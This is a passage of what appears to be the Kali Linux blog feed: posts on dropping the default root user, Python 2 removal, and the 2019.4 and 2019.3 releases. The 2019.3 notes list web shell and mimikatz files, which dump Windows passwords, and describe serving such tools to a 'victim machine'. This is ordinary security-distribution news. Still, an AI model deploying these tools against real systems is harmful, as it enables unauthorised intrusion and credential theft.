on the broad strokes we saw people were installing BackTrack on bare metal so we felt like there should be an update mechanism. Especially after walking around Defcon and noticing how many people were using a version of BackTrack that was vulnerable to a certain exploit which came out a few weeks prior. That moved us to basing BackTrack 5 off of Ubuntu instead of Slackware live <em>(February 2011)</em>. Then as more time went by we were so busy fighting with Ubuntu that we felt like we needed to move onto something else.</p> <p>That brought us to <a href="https://www.kali.org/blog/kali-linux-1-0-0-release/">Kali</a> <em>(March 2013)</em>, and being an official <a href="https://wiki.debian.org/Derivatives/Census/Kali">Debian derivative</a>.</p> <h2 id="modern-kali">Modern Kali</h2> <p>Our move to be a Debian derivative brought with a whole host of advantages. So many in-fact its not worth reviewing them here, just look at the <a href="https://www.kali.org/blog/kali-linux-whats-new/">early</a> <a href="https://www.kali.org/blog/bleeding-edge-kali-repositories/">Kali</a> <a href="https://www.kali.org/blog/kali-linux-1-0-3-release/">blog</a> <a href="https://www.kali.org/blog/kali-linux-penetration-testing-platform/">posts</a> shortly after the launch and you will see a ton of <a href="https://www.kali.org/blog/tracking-fixing-installer-bugs/">examples</a>. But one advantage that we never really talked to much about is the fact that we are based on <a href="https://wiki.debian.org/DebianTesting">Debian-Testing</a>.</p> <p>Debian has a well earned reputation for being one of the most stable Linux distros out there. Debian-Testing is the development branch of the next version of Debian, and realistically is still more stable than many mainstream Linux distros.</p> <p>While we don&rsquo;t encourage people to run Kali as their day to day operating system, over the last few years more and more users have started to do so <em>(even if they are not using it to do penetration testing full time)</em>, including some members of the Kali development team. When people do so, they obviously don&rsquo;t run as default root user. With this usage over time, there is the obvious conclusion that default root user is no longer necessary and Kali will be better off moving to a more traditional security model.</p> <h2 id="why-some-tools-require-root-access">Why Some Tools Require Root Access</h2> <p>Lets have a quick sidebar and review how some tools require root. For this, we will pick on <a href="https://www.kali.org/tools/nmap/">nmap</a>.</p> <p>Nmap is hands down the most popular portscanner in use today, and one of the most popular tools used on Kali. When ran by a non-root user doing a standard scan, nmap will default to running what is known as a connect scan (<code>-sT</code>). In this sort of scan, a full TCP three way handshake is conducted to identify if a given port is open or not. However, when ran as a root user nmap takes advantage of the additional privileges to utilize <a href="https://man7.org/linux/man-pages/man7/raw.7.html">raw sockets</a> and will conduct a <a href="https://en.wikipedia.org/wiki/Port_scanner#SYN_scanning">syn scan</a> (<code>-sS</code>), a far more popular scan type. This syn scan is not possible unless ran as root.</p> <p>This aspect of security tools requiring root level permissions traditionally has not been uncommon. Running as a root user by default makes it easier to use these tools.</p> <p>One of the, possibly surprising, conclusions we came to while looking at this issue is the number of tools that require root access has dropped over the years. This has made this default root policy less useful, bringing us to the point now where we are going to make this change.</p> <h2 id="many-applications-require-non-root-accounts">Many Applications Require Non Root Accounts</h2> <p>On the opposite direction, over the years a number of applications and services have been configured to forbid their usage as the <code>root</code> user. This has become either a maintenance burden for us (when we opted to patch out the check or reconfigure the service) or a nuisance for users that could not use their application (with <a href="https://bugs.kali.org/view.php?id=5404">chrome/chromium</a> being a well known case).</p> <p>Dropping this default root policy will thus simplify maintenance of Kali and will avoid problems for end-users.</p> <h2 id="kali-non-root-user-implementation">Kali Non-Root User Implementation</h2> <p>There are a number of changes you can expect to see as part of this change.</p> <ol> <li>Kali in live mode will be running as user <code>kali</code> password <code>kali</code>. No more <code>root</code>/<code>toor</code>. (Get ready to set up your IDS filters, as we are sure this user/pass combo will be being scanned for by bots everywhere soon).</li> <li>On install, Kali will prompt you to create a non-root user that will have administrative privileges (due to its addition to the <code>sudo</code> group). This is the same process as other Linux distros you may be familiar with.</li> <li>Tools that we identify as needing root access, as well as common administrative functions such as starting/stopping services, will interactively ask for administrative privileges (at least when started from the Kali menu). If you really don&rsquo;t care about security, and if you preferred the old model, you can install kali-grant-root and run <code>dpkg-reconfigure kali-grant-root</code> to configure password-less root rights.</li> </ol> <p>All-in-all, we don&rsquo;t expect this will be a major change for most users. It is possible that some tools or administrative functions will be missed in our review, when that happens we would ask that you create a <a href="https://bugs.kali.org/">bug report</a> so it can be tracked and corrected. (And no, <a href="https://twitter.com/kalilinux">tweeting</a> at us is not a bug report and won&rsquo;t be tracked. Sorry, but that just does not scale).</p> <h2 id="going-forward">Going Forward</h2> <p>All that said, we are still not encouraging people to use Kali as their day to day operating system. More than anything else, this is because we don&rsquo;t test for that usage pattern and we don&rsquo;t want the influx of bug reports that would come with it. However, for those of you that are familiar with Kali and want to run it as your day to day platform, this change should help you out a lot. For the rest of you, this should give you a better security model to operate under while you are doing assessments.</p> <p>As we mentioned at the start, this change is currently available in the daily builds and will be in the next weekly build. Feel free to download and test early, as we would like to have as many potential issues shaken lose before release as possible. The more active users on this the better.</p> <p>After a strong 2019 with Kali, this is a major change to start out our 2020 development cycle. Expect more as the <a href="https://www.kali.org/blog/kali-linux-roadmap-2019-2020/">year goes on</a>. As always, feel free to join in on the <a href="https://bugs.kali.org/">bug tracker</a>, <a href="https://forums.kali.org/forum.php">forums</a>, or <a href="https://gitlab.com/kalilinux">git</a> to <a href="https://www.kali.org/docs/community/contribute/">contribute</a> and be part of the future of Kali.</p></description>
</item>
<item>
<title>How Kali deals with the upcoming Python 2 End-of-Life</title>
<link>https://www.kali.org/blog/python-2-end-of-life/</link>
<guid isPermaLink="true">https://www.kali.org/blog/python-2-end-of-life/</guid>
<pubDate>Mon, 16 Dec 2019 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/python-2-end-of-life/images/python-2-end-of-life-b.jpg" type="image/jpg"/>
<description><p>Five years ago, the Python developers announced that they will <a href="https://pythonclock.org/">stop supporting Python 2 in 2020</a>. For a long time, nobody cared and Python 3 adoption was slow. But things have changed a lot lately as the deadline is right around the corner (1st January).</p> <h2 id="debian-is-removing-python-2-support">Debian is removing Python 2 support</h2> <p>Debian is planning to get rid of <a href="https://wiki.debian.org/Python/2Removal">Python 2 entirely for their next stable release</a> so they are progressively getting rid of Python 2 code. They filed release critical bugs on leaf packages (i.e. packages without reverse dependencies) asking them to be ported to Python 3. If the Python 3 port is not happening soon enough, these packages will be removed from <a href="https://wiki.debian.org/DebianTesting">Debian Testing</a> <em>(which is what Kali is based on)</em>.</p> <h2 id="consequences-for-kali">Consequences for Kali</h2> <h3 id="applications-disappearing">Applications disappearing</h3> <p>As Kali is a rolling distribution, it continuously receives updates from Debian Testing. This includes when packages &ldquo;go away&rdquo; because they have been dropped from Debian. However, they can always come back later, provided that someone ports them to Python 3.</p> <p>We have already experienced this in the case of <code>zenmap</code> which is no longer maintained by the <a href="https://nmap.org/zenmap/">nmap developers</a>. Thus, it&rsquo;s no longer built by <a href="https://packages.debian.org/search?keywords=zenmap">Debian&rsquo;s nmap source</a> package, and as a result no longer appears in Kali.</p> <h3 id="broken-applications">Broken applications</h3> <p>We have many Python 2 applications in Kali that use modules which are packaged in Debian. When Debian drops the Python 2 version of such a module, the application is broken in <a href="https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/">kali-dev</a>. kali-rolling is not affected due to the way it&rsquo;s managed but the growing divergence between kali-dev and kali-rolling is making our job more difficult: we don&rsquo;t get updates for such packages and there are other (recent/) applications that will likely require new versions of those packages!</p> <h2 id="kali-must-remove-python-2-code-too">Kali must remove Python 2 code too</h2> <p>Due to this change in the ecosystem, Kali has no other choice than to follow Debian&rsquo;s lead and remove Python 2 code as well. This giant effort is tracked with <a href="https://gitlab.com/groups/kalilinux/-/issues?label_name%5B%5D=Project%3A%3APy2Removal">many GitLab issues</a> against all packages depending on Python 2 in some way. We have already filed upstream bug reports for all the packages where there&rsquo;s no Python 3 support yet.</p> <p>How we handle each case depends on many factors:</p> <ul> <li>If upstream is working on Python 3 support, then we just wait until it&rsquo;s ready.</li> <li>If upstream is inactive or is not interested into porting its code to Python 3, then we have few choices: <ul> <li>either we remove the package;</li> <li>or we find some fork/patch that adds Python 3 support;</li> <li>or we do the porting work ourselves (rather unlikely except for trivial scripts).</li> </ul> </li> </ul> <p>It also depends on the kind of packages:</p> <ul> <li>For a Python library, it&rsquo;s a two step process: first we add Python 3 support; Python 2 support is removed later, once all reverse dependencies have been updated to use Python 3.</li> <li>For a Python application, a single update might be enough but that update might depend on having dependencies be ported to Python 3 first.</li> </ul> <p>We don&rsquo;t like to remove software, but sometimes when they are no longer maintained, we have no other choices. For important packages, we are waiting longer thus letting more time for the community to add the required Python 3 support. We might even patch them so that they display a warning inviting users to contribute, or at least understand the application may be removed in the near future.</p> <p>For packages that no longer add much value, or that have viable alternatives in Kali, we might remove them at any point in time.</p> <h2 id="how-you-can-contribute">How you can contribute</h2> <p>If one of your favorite applications appears among the <a href="https://gitlab.com/groups/kalilinux/-/issues?label_name%5B%5D=Project%3A%3APy2Removal">affected Kali packages</a> or among the <a href="https://bugs.debian.org/cgi-bin/pkgreport.cgi?tag=py2removal;users=debian-python@lists.debian.org;maint=team%2Bpkg-security@tracker.debian.org">affected packages from Debian&rsquo;s pkg-security team</a>, then you should review its situation and possibly help the upstream developer(s) by submitting a pull request adding Python 3 support. Even if upstream is not very active, we will be able to merge your changes in Kali and keep the package for longer until upstream becomes active again.</p> <p>If you don&rsquo;t have the coding skills required for this, you can still try to find a Python 3 fork/patch written by someone else and point it out to us in the corresponding GitLab issue or Debian bug report. Or, tell the developers how much you like their application and that you would like to continue to make use of it, so they should port over to Python 3.</p></description>
</item>
<item>
<title>Kali Linux 2019.4 Release (Xfce, Gnome, GTK3, Kali-Undercover, Kali-Docs, KeX, PowerShell & Public Packaging)</title>
<link>https://www.kali.org/blog/kali-linux-2019-4-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2019-4-release/</guid>
<pubDate>Tue, 26 Nov 2019 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2019-4-release/images/kali-2019.4-release.jpg" type="image/jpg"/>
<description><p>Time to grab yourself a drink, this will take a while!</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2019-4-release/images/kali-preview-boot.gif'> <img src="https://www.kali.org/blog/kali-linux-2019-4-release/images/kali-preview-boot.gif" alt="" /> </a> </p> </p> <p>We are incredibly excited to announce our fourth and final release of 2019, Kali Linux 2019.4, which is available immediately for <a href="https://www.kali.org/get-kali/">download</a>.</p> <p>2019.4 includes some exciting new updates:</p> <ul> <li>A new default desktop environment, Xfce</li> <li>New GTK3 theme (for Gnome and Xfce)</li> <li>Introduction of &ldquo;Kali Undercover&rdquo; mode</li> <li>Kali Documentation has a new home and is now Git powered</li> <li>Public Packaging - getting your tools into Kali</li> <li>Kali NetHunter KeX - Full Kali desktop on Android</li> <li>BTRFS during setup</li> <li>Added PowerShell</li> <li>The <a href="https://pkg.kali.org/pkg/linux">kernel is upgraded to version 5.3.9</a></li> <li>&hellip; Plus the normal bugs fixes and updates.</li> </ul> <h3 id="new-desktop-environment-and-gtk3-theme">New Desktop Environment and GTK3 Theme</h3> <p>There are a ton of updates to go over for this release, but the most in your face item that everyone is going to notice first are the changes to the desktop environment and theme. So let&rsquo;s cover that first.</p> <p>An update to the desktop environment has been a long time coming. We have been talking about how to address this, what we wanted to do, experimenting on different approaches, and so on for months now. As a summary we had a few issues we wanted to address head-on:</p> <ul> <li>Performance issues - Gnome is a fully-featured desktop environment with a ton of awesome things it can do. But all these features comes with overhead, often overhead that is not useful for a distribution like Kali. We wanted to speed things up, and have a desktop environment that does only what it&rsquo;s needed for, and nothing else. Gnome has been overkill for most Kali users, as many just want a window manager that allows you to run multiple terminal windows at once, and a web browser.</li> <li>Fractured user experience - We support a range of hardware, from the very high end to the very low. Because of this, traditionally our lower-end ARM builds have had a completely different UI than our standard. That&rsquo;s not optimal, and we wanted to unify this experience so it did not matter if you were running on a bare metal install on a high end laptop or using a Raspberry Pi, the UI should be the same.</li> <li>Modern look - We have been using the same UI for quite a while now, and our old theme maintainer had moved on due to lack of time. So we wanted to go with something fresh, new, and modern.</li> </ul> <p>To help us address these items, we tracked down <a href="https://drasite.com/">Daniel Ruiz de Alegría</a> and started the development of a new theme running on Xfce. Why Xfce? After reviewing the above issues, we felt that Xfce addressed them best while still being accessible to the majority of users.</p> <p>The solution we&rsquo;ve committed to is lightweight and can run on all levels of Kali installs. It is functional in that it handles the various needs of the average user with no changes. It is approachable where it uses standard UI concepts we are all familiar with to ensure there is no learning curve. And it looks great with modern UI elements that make efficient use of screen space.</p> <p>We are really excited about this UI update, and we think you are going to love it. However, as UI can be a bit like religion, if you don&rsquo;t want to leave Gnome don&rsquo;t worry. We still have a Gnome build for you, with a few changes already in place. As time goes by, we will be making changes to all of the desktop environments we release installs to get them &ldquo;close&rdquo; to a similar user experience no matter what DE you run. There will be limits to this, as we don&rsquo;t have the resources to heavily invest in tweaking all these different environments. So if there is something you would like to see, feel free to submit a <a href="https://bugs.kali.org/">feature request</a>!</p> <p>We have also released a FAQ about the new theme that you can find on our <a href="https://www.kali.org/docs/general-use/xfce-faq/">docs page</a>. This includes some common items like how to switch to the theme on your existing install, how to change off of it if you don&rsquo;t like it, and so on.</p> <h3 id="kali-undercover">Kali Undercover</h3> <p>With the change to the environment, we thought we would take a side step and do something fun. Thanks to Robert, who leads our penetration testing team, for suggesting a Kali theme that looks like Windows to the casual view, we have created the Kali Undercover theme.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2019-4-release/images/kali-undercover-1.gif'> <img src="https://www.kali.org/blog/kali-linux-2019-4-release/images/kali-undercover-1.gif" alt="" /> </a> </p> </p> <p>Say you are working in a public place, hacking away, and you might not want the distinctive Kali dragon for everyone to see and wonder what it is you are doing. So, we made a little script that will change your Kali theme to look like a default Windows installation. That way, you can work a bit more incognito. After you are done and in a more private place, run the script again and you switch back to your Kali theme. Like magic!</p> <h3 id="kali-docs-is-now-on-markdown-and-new-home-docs">Kali-Docs is now on Markdown and new home (/docs/)</h3> <p>This may not be as flashy as the new theme, but the changes to the documentation we have done is just as significant.</p> <p>One of our go-forward goals with Kali is to move more of the development into the public and make it as easy as possible for anyone <em>(that means you!)</em> to get <a href="https://www.kali.org/docs/community/contribute/">involved and contribute</a> to Kali. That&rsquo;s what our move to GitLab <a href="https://www.kali.org/blog/kali-linux-roadmap-2019-2020/">earlier in the year</a> was all about. Another part of this is changing how we deal with docs.</p> <p>We have since moved all of our documentation into Markdown in a <a href="https://gitlab.com/kalilinux/documentation/kali-docs">public Git repository</a>. From here on out anyone, not just Kali staff, can contribute to better documentation through merge requests. We will still approve any content changes, but once merged, changes will be automatically available on the docs section of our website.</p> <p>We encourage everyone to get involved! If you see something wrong in the existing docs, change it! If you have an idea for new docs, write it! These sorts of contributions make Kali better for everyone.</p> <p>This is just the first step. With this change in place, coming soon watch for a Kali-Docs package in Kali that gives you full offline access to the documentation on every install of Kali. Perfect for those situations where you are working in a closed-off environment with no Internet access.</p> <h3 id="public-packaging">Public Packaging</h3> <p>One of the more significant new documents we have done is <a href="https://www.kali.org/docs/development/public-packaging/">documenting how you can make a new package</a> that will get included in Kali.</p> <p>One of the most common bug reports is requests for us to add new tools or update existing ones. Oftentimes, by the tool developers themselves as they recognize that having their tool in the Kali repo is the easiest distribution channel for security assessment tools there is. The volume of this has always been difficult to keep up with, and we have to make some hard decisions on where to commit our limited resources.</p> <p>Now with this work-flow in place and documented, you don&rsquo;t have to wait on us. Go ahead and package up your tool and submit it off to us for approval. This is an awesome way to get involved with improving Kali.</p> <h3 id="btrfs-during-setup">BTRFS during setup</h3> <p>Another significant new addition to the documentation is the <a href="https://www.kali.org/docs/installation/btrfs/">use of BTRFS as your root file system</a>. This is an amazing approach documented by @Re4son, that when done gives you the ability to do file system rollbacks after upgrades.</p> <p>When you are in a VM and about to try something new, you will often take a snapshot in case things go wrong you can easily go back to a known-good state. However, when you run Kali bare metal that&rsquo;s not so easy. So you end up being extra careful, or if things go wrong have a lot of manual clean up to do. With BTRFS, you have this same snapshot capability on a bare metal install!</p> <p>As this is new, it&rsquo;s not integrated into our installer yet. Once we get some feedback on how it&rsquo;s working for everyone, the next step is to streamline this and make it an easier option in our installer. So if you try it out, be sure to let us know how it works for you!</p> <h3 id="powershell">PowerShell</h3> <p>On to other features, in case you missed it PowerShell is now in Kali. This has been really great to bring the ability to execute PowerShell scripts directly on Kali.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2019-4-release/images/power-shell-1-1.png'> <img src="https://www.kali.org/blog/kali-linux-2019-4-release/images/power-shell-1-1.png" alt="" /> </a> </p> </p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2019-4-release/images/kali-pwsh-powershell-1.png'> <img src="https://www.kali.org/blog/kali-linux-2019-4-release/images/kali-pwsh-powershell-1.png" alt="" /> </a> </p> </p> <h3 id="nethunter-kex---full-kali-desktop-on-android-phones">NetHunter Kex - Full Kali Desktop on Android phones</h3> <p>Another feature we are super excited about is the introduction of NetHunter Kex. In a nutshell, this allows you to attach your Android device to an HDMI output along with Bluetooth keyboard and mouse and get a full, no compromise, Kali desktop. Yes. From your phone.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2019-4-release/images/kali-kex-theme.gif'> <img src="https://www.kali.org/blog/kali-linux-2019-4-release/images/kali-kex-theme.gif" alt="" /> </a> </p> </p> <p>We had a live <a href="https://www.offsec.com/pwk-oscp/">Penetration Testing with Kali</a> course we were teaching, and NetHunter Kex was just in a beta stage. So we wanted to really push the limits. So, in the live course, what we did was attach a USB-C hub to our OnePlus7. This gave us HDMI and Ethernet access. We attached the HDMI to the projector and used a bluetooth keyboard/mouse. With this, we were able to do an entire PWK module from the phone.</p> <p>This is a feature you have to see to believe. Until you experience it, you won&rsquo;t fully understand what this provides. With a strong enough phone, this is very similar to using a nice full-featured portable ARM desktop that happens to fit in your pocket. The possible ways you can leverage this in assessments is huge.</p> <p>To get a full breakdown on how to use NetHunter Kex, check out our <a href="https://www.kali.org/docs/nethunter/nethunter-kex-manager/">docs at</a>.</p> <h2 id="arm">ARM</h2> <p><strong>2019.4 is the last release that will support 8GB sdcards on ARM. Starting in 2020.1, a 16GB sdcard will be the minimum we support. You will always be able to create your own image that supports smaller cards if you desire.</strong></p> <ul> <li>RaspberryPi kernel was updated to 4.19.81, and the firmware package was updated to include the eeprom updates for the RaspberryPi 4.</li> </ul> <p>During the release testing, a limited number of devices were not showing the Kali menu properly. This was not critical enough to delay the release, so instead as a work-around you can run the following command to display the menu correctly:</p> <pre><code class="language-sh">apt update &amp;&amp; apt dist-upgrade </code></pre> <p>Once this completes, log out, so you&rsquo;re back at the login manager. Then switch to a console via CTRL+ALT+F11 (on the Chromebooks this is the key pointing left next to the ESC key).</p> <p>Login and then run:</p> <pre><code class="language-sh">rm -rf .cache/ .config/ .local/ &amp;&amp; sync &amp;&amp; reboot </code></pre> <p>After reboot, the menu will have the correct entries. We&rsquo;re still looking into why it occurs on only some of the images.</p> <h2 id="download-kali-linux-20194">Download Kali Linux 2019.4</h2> <p>So what are you waiting for? Start the <a href="https://www.kali.org/get-kali/">download</a> now!</p> <p>Also, just to mention we do also produce <a href="https://cdimage.kali.org/kali-images/kali-weekly/">weekly builds</a> that you can use as well. If it&rsquo;s been some time since our last release and you want the latest packages you don&rsquo;t have to go off our latest release and update. You can just use the weekly image instead, and have fewer updates to do. Just know these are automated builds that we don&rsquo;t QA like we do our standard release images.</p> <p>If you already have an existing Kali installation, remember you can always do a quick update:</p> <pre><code class="language-console">root@kali:~# cat &lt;/etc/apt/sources.list deb http://http.kali.org/kali kali-rolling main contrib non-free EOF root@kali:~# root@kali:~# apt update &amp;&amp; apt -y full-upgrade root@kali:~# root@kali:~# [ -f /var/run/reboot-required ] &amp;&amp; reboot -f </code></pre> <p>If you want to switch to our new Xfce:</p> <pre><code class="language-console">root@kali:~# apt -y install kali-desktop-xfce </code></pre> <p>You should now be on Kali Linux 2019.4. We can do a quick check by doing:</p> <pre><code class="language-console">root@kali:~# grep VERSION /etc/os-release VERSION=&quot;2019.4&quot; VERSION_ID=&quot;2019.4&quot; VERSION_CODENAME=&quot;kali-rolling&quot; root@kali:~# root@kali:~# uname -v #1 SMP Debian 5.3.9-3kali1 (2019-11-20) root@kali:~# root@kali:~# uname -r 5.3.0-kali2-amd64 root@kali:~# </code></pre> <p>NOTE: The output of &ldquo;uname -r&rdquo; may be different depending on <a href="https://pkg.kali.org/pkg/linux-latest">architecture</a>.</p> <p>As always, should you come across any bugs in Kali, please submit a report on our <a href="https://bugs.kali.org/main_page.php">bug tracker</a>. We&rsquo;ll never be able to fix what we don&rsquo;t know about.</p></description>
</item>
<item>
<title>Kali Linux 2019.3 Release (Cloudflare, Kali-status, metapackages, Helper-Scripts & LXD)</title>
<link>https://www.kali.org/blog/kali-linux-2019-3-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2019-3-release/</guid>
<pubDate>Mon, 02 Sep 2019 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2019-3-release/images/kali-release-2019.jpg" type="image/jpg"/>
<description><p>We are pleased to announce that our third release of 2019, Kali Linux 2019.3, is available immediately for <a href="https://www.kali.org/get-kali/">download</a>. This release brings our <a href="https://pkg.kali.org/pkg/linux">kernel up to version 5.2.9</a>, and includes various new features across the board with NetHunter, ARM and packages (plus the normal bugs fixes and updates).</p> <p>As promised in our <a href="https://www.kali.org/blog/kali-linux-roadmap-2019-2020/">roadmap blog post</a>, there are both user facing and backend updates.</p> <h2 id="cloudflare">Cloudflare</h2> <p><a href="https://www.kali.org/docs/policy/kali-linux-open-source-policy/">Kali Linux is Open-source</a>, and <a href="https://blog.cloudflare.com/cloudflare-open-source-your-upgrade-is-on-the-house/">Cloudflare hearts Open-source</a> - so it&rsquo;s a perfect match! As a result, Cloudflare has graciously allowed us to use their content delivery network (CDN) to mirror our repository, allowing us to now distribute our content through them. A more technical breakdown can be found on <a href="https://blog.cloudflare.com/cloudflare-repositories-ftw/">their blog</a>.</p> <p>We are currently running the Cloudflare services side by side with our standard and community mirrors.</p> <p>If you notice the <code>kali.download</code> domain appearing on screen when you run <code>apt update</code>, this means you&rsquo;re using Cloudflare&rsquo;s services.</p> <h2 id="kali-status">Kali Status</h2> <p>We now have a <a href="https://status.kali.org/">status page - status.kali.org</a>. This provides an overview of all public facing domains and allows you to check if they are responding correctly. We have included all the sites we control, as well as the community mirrors for the repositories, allowing you to see everything you could possibly use (even if you are unaware)!</p> <p>Note: Our load balancer on http.kali.org should automatically detect when a mirror is not responding and redirect you to one that is. As such, <code>apt</code> should always work <em>(even if slow at times)</em>.</p> <h2 id="metapackages">Metapackages</h2> <p>We already announced the <a href="https://www.kali.org/blog/major-metapackage-makeover/">changes to metapackages in a previous blog post</a>, and the <a href="https://www.kali.org/docs/general-use/metapackages/">Kali tool listing page</a> goes into more detail on it. However, to recap, the default toolset going forward has changed. To help with this transition, for this release only (Kali 2019.3), there is a one-off, extra image called <code>kali-linux-large-2019.3-amd64.iso</code>, that contains all previous default tools.</p> <p>Going forward, during our release cycle, we will be evaluating which tools belong to each group:</p> <ul> <li>Kali-linux-default - tools we believe are essential to a penetration tester</li> <li>Kali-linux-large - for penetration testers who have a wider set of non standard/common situations</li> <li>Kali-linux-everything - for those who want it all (and without Internet access during the assessment)</li> </ul> <p>With the switchover to <a href="https://gitlab.com/kalilinux">GitLab</a> (<a href="https://www.kali.org/blog/kali-linux-roadmap-2019-2020/">read more here</a>), we will soon begin accepting community package submissions. This means that anyone can directly submit improvements to us&ndash;anything from minor fixes and patches to complete tool packages is encouraged. We&rsquo;re currently working through the documentation on how to create a package, making it easier for folks to get started and help out. More details to come later this year.</p> <p>We also noticed some packages failed to build on certain ARM architectures, which has now been fixed (allowing for more tools to be used on different platforms!).</p> <h2 id="helper-scripts">Helper Scripts</h2> <p>There&rsquo;s a wide range of tools in Kali. Some tools are designed to be used on Linux, some are designed for Windows <em>(and we can still use them with WINE)</em>, and some are static resources. During our recent <a href="https://www.kali.org/blog/major-metapackage-makeover/">metapackage refresh</a>, we took the time to create a few &ldquo;helper scripts&rdquo;.</p> <p>You may have installed a package, gone ahead and typed in the package name to run it, and the response back was <code>command not found</code>. Not any more!</p> <p>We understood it may not have been obvious how to use them straight away. As a result, all of our static resources should now be easy to find. Just type in the package name (Such as <a href="https://pkg.kali.org/pkg/payloadsallthethings">PayloadsAllTheThings</a>, <a href="https://pkg.kali.org/pkg/seclists">SecLists</a>, <a href="https://pkg.kali.org/pkg/webshells">WebShells</a> and <a href="https://pkg.kali.org/pkg/wordlists">Wordlists</a> to a name a few), you&rsquo;ll see a brief description, a directory listing, and then be moved to the folder:</p> <pre><code class="language-console">root@kali:~# webshells &gt; webshells ~ Collection of webshells /usr/share/webshells |--asp |--aspx |--cfm |--jsp |--perl |--php root@kali:/usr/share/webshells# </code></pre> <p>When it comes to Windows binaries (Such as <a href="https://pkg.kali.org/pkg/hyperion">hyperion</a>, <a href="https://pkg.kali.org/pkg/mimikatz">mimikatz</a>, and <a href="https://pkg.kali.org/pkg/windows-privesc-check">windows-privesc-check</a>), depending on their functionality, it will now either start up WINE or, like above, hotlink you to the location:</p> <pre><code class="language-console">root@kali:~# mimikatz &gt; mimikatz ~ Uses admin rights on Windows to display passwords in plaintext /usr/share/windows-resources/mimikatz |---kiwi_passwords.yar |---mimicom.idl |---Win32 |----mimidrv.sys |----mimikatz.exe |----mimilib.dll |----mimilove.exe |---x64 |----mimidrv.sys |----mimikatz.exe |----mimilib.dll root@kali:/usr/share/windows-resources/mimikatz# root@kali:/usr/share/windows-resources/mimikatz# shellter 1010101 01 10 0100110 10 01 11001001 0011101 001001 11 10 01 00 01 01 01 10 11 10 0010011 1110001 11011 11 10 00 10011 011001 11 00 10 01 11 01 11 01 01 11 0010010 11 00 0011010 100111 000111 00 1100011 01 10 v7.1 www.ShellterProject.com Wine Mode Choose Operation Mode - Auto/Manual (A/M/H): </code></pre> <p>On the subject of tool type, we have altered the location of packages related to Windows (which eagle eye readers may have spotted in the example above). These types of tools are now located in <code>/usr/share/windows-resources/</code>. For example, our windows binaries used to be in <code>/usr/share/windows-binaries/</code>, instead, they are in <code>/usr/share/windows-resources/binaries/</code>. We have done this to make it easier to discover what resources can be transferred over to a Windows platform and executed directly there. Using this new location as a root path (example: http <code>python3 -m http.server</code>, or samba <code>impacket-smbserver toolz .</code>), you can quickly share everything to the target/victim machine).</p> <h2 id="tool-updates--new-packages">Tool Updates &amp; New Packages</h2> <p>As always, we have our updates for all our tools, including (but not limited to):</p> <ul> <li><a href="https://pkg.kali.org/pkg/burpsuite">Burp Suite</a></li> <li><a href="https://pkg.kali.org/pkg/hostapd-wpe">HostAPd-WPE</a></li> <li><a href="https://pkg.kali.org/pkg/hyperion">Hyperion</a></li> <li><a href="https://pkg.kali.org/pkg/kismet">Kismet</a></li> <li><a href="https://pkg.kali.org/pkg/nmap">Nmap</a></li> </ul> <p>There is a new tool (and it is included by default), <a href="https://pkg.kali.org/pkg/amass">amass</a>, that has been well received in the bug bounty world.</p> <h2 id="gnome-users">GNOME Users</h2> <p>If you use the default Kali image, it is <em>(currently)</em> using GNOME for the desktop environment. If you used the command line for a period of time, chances are you noticed it was refreshing the repositories in the background. This has now been <a href="https://bugs.kali.org/view.php?id=5236">disabled</a>.</p> <blockquote> <p>&ldquo;The quieter you become, the more you are able to hear&rdquo;</p> </blockquote> <h2 id="nethunter-updates">NetHunter Updates</h2> <p>The NetHunter crew has been adding in features left, right, and center to their project. One thing to note is package management is done through the F-Droid compatible <a href="https://store.nethunter.com/">NetHunter store</a>, so you can even choose to have a NetHunter device without any Google Play.</p> <p>The proxmark3 client supports RDV4 out of the box and NetHunter now also works with Android&rsquo;s new partition layouts (A/B partitions no longer have one boot partition and one recovery partition. They are all the same, but twice! A few paths have also changed, such as <code>/system</code> now actually being under <code>/system/system</code>), which allows it to be built for the latest generation of devices.</p> <p>Plus, there are new apps in the NetHunter app store, thanks to <a href="https://twitter.com/mayank_metha">@mayank_metha</a> for Rucky and the <a href="https://github.com/termux/termux-app/graphs/contributors">Termux team</a> for Termux.</p> <p>There are 4 additional images for you to try NetHunter on (some may look familiar, as they are back due to community demand):</p> <ul> <li>LG V20 International Edition</li> <li>Nexus 5X</li> <li>Nexus 10</li> <li>OnePlus 7 (Our new flagship device!)</li> </ul> <p><p> <a href='https://www.kali.org/blog/kali-linux-2019-3-release/images/nethunter-release-2019.3-02.png'> <img src="https://www.kali.org/blog/kali-linux-2019-3-release/images/nethunter-release-2019.3-02.png" alt="" /> </a> </p> </p> <p>With this announcement, the <strong>OnePlus 7</strong> is now the phone we recommend for Kali NetHunter. It is the latest and greatest flagship device for half the price of other devices. The specifications are as follows:</p> <ul> <li>Snapdragon 855</li> <li>8GB RAM</li> <li>256GB storage</li> <li>Still cheaper than Google pixel 3a (mid-range phone!) ;)</li> </ul> <p>And here is a sneaky peak at the new boot animation, across all devices:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2019-3-release/images/nethunter-release-2019.3-01.gif'> <img src="https://www.kali.org/blog/kali-linux-2019-3-release/images/nethunter-release-2019.3-01.gif" alt="" /> </a> </p> </p> <h2 id="arm-update">ARM Update</h2> <p>For ARM devices this release, we have added support for the <a href="https://www.pine64.org/pinebook/">PINEBOOK</a> as well as the <a href="https://www.gateworks.com/imx6-single-board-computer-gateworks-ventana-family">Gateworks Ventana</a> machines.</p> <p>The RaspberryPi kernel has been bumped to version 4.19.66, which includes support for all of the RAM on 64-bit versions of the RaspberryPi 4. The RaspberryPi Zero W has seen improvements as well.</p> <p>Bluetooth firmware that was accidentally dropped has been added back in, and the <code>rc.local</code> file has been fixed to properly stop <code>dmesg</code> spam from showing up on the first console.</p> 